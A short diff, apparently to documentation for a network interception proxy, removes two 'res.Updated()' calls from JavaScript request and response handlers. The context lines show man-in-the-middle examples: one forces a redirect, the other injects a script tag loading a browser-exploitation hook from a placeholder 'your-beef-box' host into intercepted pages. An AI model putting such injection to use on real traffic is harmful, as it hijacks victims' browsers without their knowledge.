@@ -276,7 +276,6 @@ function onRequest(req, res) {
         res.Status      = 301;
         res.Headers     = "Location: https://www.facebook.com/\n" +
                           "Connection: close";
-        res.Updated()
     }
 }
 ```
@@ -316,7 +315,6 @@ function onResponse(req, res) {
                 '</head>', 
                 '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
             ); 
-            res.Updated();
         }
     }
 }
